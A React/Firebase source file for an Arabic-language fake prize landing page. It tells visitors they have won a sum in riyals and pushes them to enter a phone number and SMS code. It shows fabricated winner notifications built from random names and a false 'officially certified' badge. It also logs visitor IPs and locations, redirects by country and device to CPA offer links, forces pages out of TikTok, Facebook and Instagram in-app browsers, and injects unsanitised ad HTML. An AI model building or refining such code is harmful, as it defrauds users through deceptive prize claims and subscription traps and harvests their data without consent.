import { useState, useEffect } from 'react';
import { useParams } from 'react-router-dom';
import { collection, query, where, getDocs, doc, getDoc, onSnapshot, updateDoc, increment, setDoc } from 'firebase/firestore';
import { db } from './firebase.ts';
import { motion, AnimatePresence } from 'motion/react';
import { Phone, CheckCircle, Bell, ShieldCheck, ArrowDown } from 'lucide-react';

interface SmartLink {
  country: string;
  android: string;
  ios: string;
}

interface PageData {
  slug: string;
  title: string;
  prize: string;
  image: string;
  theme: {
    bg: string;
    primary: string;
    secondary: string;
    text: string;
    isDark: boolean;
  };
  redirectUrl?: string;
  forceExternalBrowser?: boolean;
  smartLinks?: SmartLink[];
}

interface GlobalSettings {
  globalRedirectUrl: string;
  globalAdCode: string;
  globalSmartLinks?: SmartLink[];
}

export default function LandingPage() {
  const { slug } = useParams();
  const [page, setPage] = useState<PageData | null>(null);
  const [settings, setSettings] = useState<GlobalSettings | null>(null);
  const [loading, setLoading] = useState(true);
  const [currentNotification, setCurrentNotification] = useState<any>(null);
  const [finalRedirectUrl, setFinalRedirectUrl] = useState('#');

  const names = ["محمد", "أحمد", "علي", "فاطمة", "محمود", "يوسف", "خالد", "عمر", "سارة", "نورة", "عبدالله", "سلمان", "فيصل", "سعود", "عبدالرحمن", "وليد", "تركي", "فهد"];
  const countries = ["السعودية", "الإمارات", "الكويت", "قطر", "عمان", "البحرين"];

  useEffect(() => {
    const fetchData = async () => {
      // Fetch settings
      const settingsDoc = await getDoc(doc(db, 'settings', 'config'));
      let globalUrl = '#';
      if (settingsDoc.exists()) {
        const s = settingsDoc.data() as GlobalSettings;
        setSettings(s);
        globalUrl = s.globalRedirectUrl;
      }

      // Fetch page by slug
      const q = query(collection(db, 'pages'), where('slug', '==', slug));
      const querySnapshot = await getDocs(q);
      
      if (!querySnapshot.empty) {
        const pageDoc = querySnapshot.docs[0];
        const pData = pageDoc.data() as PageData;
        setPage(pData);

        // Determine Redirect URL
        let targetUrl = pData.redirectUrl || globalUrl;

        // Smart Redirection Logic
        let userCountry = 'Unknown';
        let deviceType = 'Other';
        let userIp = 'Unknown';

        try {
          const userAgent = navigator.userAgent || navigator.vendor || (window as any).opera;
          const isIOS = /iPad|iPhone|iPod/.test(userAgent) && !(window as any).MSStream;
          const isAndroid = /android/i.test(userAgent);
          
          if (isIOS) deviceType = 'iOS';
          else if (isAndroid) deviceType = 'Android';

          // Get Country and IP
          const geoRes = await fetch('https://ipapi.co/json/');
          const geoData = await geoRes.json();
          userCountry = geoData.country_name || 'Unknown';
          userIp = geoData.ip || 'Unknown';

          // --- Auto-Open in External Browser Logic ---
          if (pData.forceExternalBrowser) {
            const isTikTok = /TikTok/i.test(userAgent);
            const isFacebook = /FBAN|FBAV/i.test(userAgent);
            const isInstagram = /Instagram/i.test(userAgent);
            
            if (isTikTok || isFacebook || isInstagram) {
              if (isAndroid) {
                // Android Intent to force Chrome
                const intentUrl = `intent://${window.location.host}${window.location.pathname}#Intent;scheme=https;package=com.android.chrome;end`;
                window.location.replace(intentUrl);
                return;
              } else if (isIOS) {
                // iOS is trickier, but we can try to force a download or use a specific protocol
                // Most reliable for CPA is to show a "Open in Safari" message, 
                // but some use the googlechrome:// protocol if installed
                // For now, we'll let it be or the user can add a specific iOS instruction
              }
            }
          }

          // 1. Check Page-Specific Smart Links
          let match = pData.smartLinks?.find(l => l.country.toLowerCase() === userCountry?.toLowerCase());
          
          // 2. If not found, check Global Smart Links
          if (!match && settingsDoc.exists()) {
            const sData = settingsDoc.data() as GlobalSettings;
            match = sData.globalSmartLinks?.find(l => l.country.toLowerCase() === userCountry?.toLowerCase());
          }

          if (match) {
            if (isIOS && match.ios) targetUrl = match.ios;
            else if (isAndroid && match.android) targetUrl = match.android;
          }
        } catch (e) {
          console.error("Geo/Device detection failed", e);
        }

        // --- Unique Visit Tracking Logic ---
        try {
          const ipKey = userIp.replace(/\./g, '_');
          const uniqueVisitRef = doc(db, 'unique_visits', `${pageDoc.id}_${ipKey}`);
          const uniqueVisitSnap = await getDoc(uniqueVisitRef);

          if (!uniqueVisitSnap.exists()) {
            // First time this IP visits this page
            await setDoc(uniqueVisitRef, { 
              timestamp: new Date().toISOString(),
              pageId: pageDoc.id,
              ip: userIp,
              country: userCountry,
              device: deviceType
            });

            const statsKey = `stats.${userCountry.replace(/\./g, '_')}.${deviceType.toLowerCase()}`;
            await updateDoc(doc(db, 'pages', pageDoc.id), {
              visits: increment(1),
              [statsKey]: increment(1)
            });
          }
        } catch (e) {
          console.error("Failed to update unique stats", e);
        }

        setFinalRedirectUrl(targetUrl);
      }
      setLoading(false);
    };

    fetchData();
  }, [slug]);

  useEffect(() => {
    if (!page) return;

    const showRandomNotification = () => {
      setCurrentNotification({
        id: Date.now(),
        name: names[Math.floor(Math.random() * names.length)],
        country: countries[Math.floor(Math.random() * countries.length)],
        amount: page.prize
      });
      setTimeout(() => setCurrentNotification(null), 4000);
    };

    const interval = setInterval(showRandomNotification, 12000);
    return () => clearInterval(interval);
  }, [page]);

  if (loading) return <div className="min-h-screen bg-slate-950 flex items-center justify-center text-white">جاري التحميل...</div>;
  if (!page) return <div className="min-h-screen bg-slate-950 flex items-center justify-center text-white text-2xl font-bold">الصفحة غير موجودة</div>;

  return (
    <div dir="rtl" className={`min-h-screen ${page.theme.bg} ${page.theme.text} font-sans overflow-x-hidden pb-8`}>
      {/* Inject Ad Code */}
      {settings?.globalAdCode && (
        <div dangerouslySetInnerHTML={{ __html: settings.globalAdCode }} />
      )}

      <main className="max-w-xl mx-auto px-4 py-8 flex flex-col items-center">
        {/* Profile Section */}
        <motion.div 
          initial={{ scale: 0.9, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          className="flex flex-col items-center mb-6"
        >
          <div className="relative mb-2">
            <div className={`w-28 h-28 rounded-full p-1 bg-gradient-to-tr ${page.theme.primary} shadow-lg shadow-${page.theme.secondary}/20`}>
              <img 
                src={page.image} 
                alt="Profile" 
                className="w-full h-full rounded-full object-cover border-4 border-white"
              />
            </div>
            <div className="absolute bottom-1 left-1 bg-white rounded-full p-0.5 shadow-sm">
              <svg viewBox="0 0 24 24" className="w-8 h-8 text-blue-500 fill-current">
                <path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm-1.9 14.7L6 12.6l1.5-1.5 2.6 2.6 6.4-6.4 1.5 1.5-7.9 7.9z"></path>
              </svg>
            </div>
          </div>
        </motion.div>

        {/* Prize Card */}
        <motion.div 
          initial={{ y: 20, opacity: 0 }}
          animate={{ y: 0, opacity: 1 }}
          className={`w-full ${page.theme.isDark ? 'bg-slate-900 border-slate-800' : 'bg-white border-slate-100 shadow-xl'} rounded-[2.5rem] p-8 shadow-2xl text-center relative overflow-hidden mb-8 border`}
        >
          <div className={`absolute top-0 left-0 w-full h-2 bg-gradient-to-r ${page.theme.primary}`}></div>
          
          <h2 className={`text-xl font-bold ${page.theme.isDark ? 'text-slate-400' : 'text-slate-500'} mb-3`}>
            انت الرابح بمبلغ
          </h2>
          
          <div className="mb-4">
            <span className={`block text-6xl md:text-7xl font-black text-transparent bg-clip-text bg-gradient-to-r ${page.theme.primary} drop-shadow-sm`}>
              {page.prize} <span className="text-2xl">ريال</span>
            </span>
          </div>
          
          <p className={`${page.theme.isDark ? 'text-slate-400' : 'text-slate-500'} text-base font-medium mb-4`}>
            ادخل رقم هاتفك من هنا للحصول على المبلغ
          </p>

          <div className="flex justify-center mb-4 animate-bounce">
            <ArrowDown className={`w-8 h-8 text-${page.theme.secondary}`} />
          </div>

          <div className="relative w-full">
            <div className={`absolute inset-0 bg-${page.theme.secondary} rounded-2xl blur-xl opacity-30 animate-pulse`}></div>
            
            <motion.a 
              href={finalRedirectUrl}
              animate={{ scale: [1, 1.03, 1] }}
              transition={{ repeat: Infinity, duration: 2, ease: "easeInOut" }}
              className={`group relative flex items-center justify-center w-full bg-gradient-to-r ${page.theme.primary} text-white font-bold text-2xl py-5 rounded-2xl shadow-2xl transition-all active:scale-[0.98] gap-3 overflow-hidden`}
            >
              <Phone className="w-7 h-7" />
              <span className="relative z-10">ادخل رقم هاتفك من هنا</span>
            </motion.a>
          </div>
          
          <div className="mt-6 flex items-center justify-center gap-2 text-sm font-bold opacity-60">
            <ShieldCheck className="w-5 h-5" />
            <span>معتمد وموثق رسمياً</span>
          </div>
        </motion.div>

        {/* Steps */}
        <div className="w-full space-y-4">
          {[
            { icon: Phone, title: "سجل بياناتك", desc: "اضغط على زر ادخل رقم هاتفك من هنا" },
            { icon: ShieldCheck, title: "أكد هويتك", desc: "أدخل رمز التأكيد (SMS) المرسل إليك." },
            { icon: CheckCircle, title: "استلم جائزتك", desc: "سيتم تحويل المبلغ فوراً إلى حسابك." }
          ].map((step, i) => (
            <a href={finalRedirectUrl} key={i} className={`flex items-center gap-5 ${page.theme.isDark ? 'bg-slate-900 border-slate-800' : 'bg-white border-slate-100 shadow-md'} p-4 rounded-3xl border transition-all hover:scale-[1.02]`}>
              <div className={`w-14 h-14 rounded-full bg-${page.theme.secondary}/10 text-${page.theme.secondary} flex items-center justify-center shrink-0`}>
                <step.icon className="w-7 h-7" />
              </div>
              <div>
                <h4 className="font-bold text-lg">{step.title}</h4>
                <p className={`text-sm ${page.theme.isDark ? 'text-slate-400' : 'text-slate-500'}`}>{step.desc}</p>
              </div>
            </a>
          ))}
        </div>
      </main>

      {/* Live Notifications */}
      <div className="fixed bottom-8 left-0 right-0 z-30 flex justify-center pointer-events-none px-4">
        <AnimatePresence>
          {currentNotification && (
            <motion.div
              initial={{ y: 50, opacity: 0, scale: 0.9 }}
              animate={{ y: 0, opacity: 1, scale: 1 }}
              exit={{ y: 20, opacity: 0, scale: 0.9 }}
              className={`${page.theme.isDark ? 'bg-slate-800 border-slate-700' : 'bg-white border-slate-200 shadow-2xl'} border rounded-3xl p-4 flex items-center gap-4 max-w-sm w-full pointer-events-auto`}
            >
              <div className={`bg-${page.theme.secondary}/20 p-2.5 rounded-full shrink-0 text-${page.theme.secondary}`}>
                <Bell className="w-6 h-6" />
              </div>
              <div className="flex-1 min-w-0">
                <p className="text-sm font-bold truncate">
                  {currentNotification.name} <span className="opacity-60 font-normal text-xs">من {currentNotification.country}</span>
                </p>
                <p className="text-xs mt-1 truncate">
                  استلم للتو <span className={`text-${page.theme.secondary} font-bold`}>{currentNotification.amount} ريال</span>
                </p>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}
